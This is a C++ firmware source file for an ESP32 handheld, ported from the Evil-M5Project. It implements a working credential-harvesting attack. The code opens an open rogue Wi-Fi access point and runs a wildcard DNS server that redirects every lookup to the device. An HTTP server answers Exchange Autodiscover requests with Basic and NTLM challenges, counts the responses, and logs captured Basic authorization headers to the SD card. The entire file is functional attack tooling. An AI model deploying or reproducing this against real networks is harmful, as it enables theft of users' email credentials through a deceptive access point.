/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Rogue AP + DNS + Autodiscover XML / Basic+NTLM capture.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "autodiscover.h"
#if defined(EVIL_EXTENSIONS)
#include "root/config/config.h"
#include "root/storage/paths.h"
#include "root/storage/sd_functions.h"
#include "root/ui/display.h"
#include <DNSServer.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <globals.h>

void autodiscoverMenu() {
    String ssid = kvxConfig.wifiAp.ssid.length() ? kvxConfig.wifiAp.ssid : "kvxputer";
    WiFi.mode(WiFi.isConnected() ? WIFI_AP_STA : WIFI_AP);
    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str(), nullptr, 1, 0, 8);
    DNSServer dns;
    dns.start(53, "*", apIP);
    WiFiServer http(80);
    http.begin();
    int basic = 0, ntlm = 0;
    String xml =
        "<?xml version=\"1.0\"?><Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/"
        "responseschema/2006\"><Response><Error Time=\"00:00:00\" Id=\"1\"><ErrorCode>600</ErrorCode>"
        "<Message>Invalid Request</Message></Error></Response></Autodiscover>";
    drawMainBorderWithTitle("Autodiscover");
    tft.drawString("AP " + ssid + " " + apIP.toString(), 8, 40);
    tft.drawString("ESC to stop", 8, tftHeight - 20);
    EscPress = false;
    while (!check(EscPress) && !returnToMenu) {
        dns.processNextRequest();
        WiFiClient c = http.available();
        if (c) {
            String req;
            unsigned long t0 = millis();
            while (c.connected() && millis() - t0 < 2000) {
                while (c.available()) req += (char)c.read();
                if (req.indexOf("\r\n\r\n") >= 0) break;
                delay(1);
            }
            req.toLowerCase();
            String hdr;
            if (req.indexOf("authorization: ntlm") >= 0) {
                ntlm++;
                hdr = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\n"
                      "Connection: close\r\n\r\n";
            } else if (req.indexOf("authorization: basic") >= 0) {
                basic++;
                hdr = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) +
                      "\r\nConnection: close\r\n\r\n" + xml;
                FS *fs = nullptr;
                if (getFsStorage(fs) && fs) {
                    kvx::paths::ensureDir(*fs, kvx::paths::NETOPS_RESPONDER);
                    File f = fs->open(String(kvx::paths::NETOPS_RESPONDER) + "/autodiscover.txt", FILE_APPEND);
                    if (f) {
                        f.println(req.substring(0, 200));
                        f.close();
                    }
                }
            } else {
                hdr = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"autodiscover\"\r\n"
                      "WWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            }
            c.print(hdr);
            c.stop();
            tft.fillRect(8, 56, tftWidth - 16, 24, kvxConfig.bgColor);
            tft.drawString("Basic " + String(basic) + " NTLM " + String(ntlm), 8, 56);
        }
        delay(5);
    }
    http.end();
    dns.stop();
    displayInfo("Basic " + String(basic) + "\nNTLM " + String(ntlm), true);
}
#endif
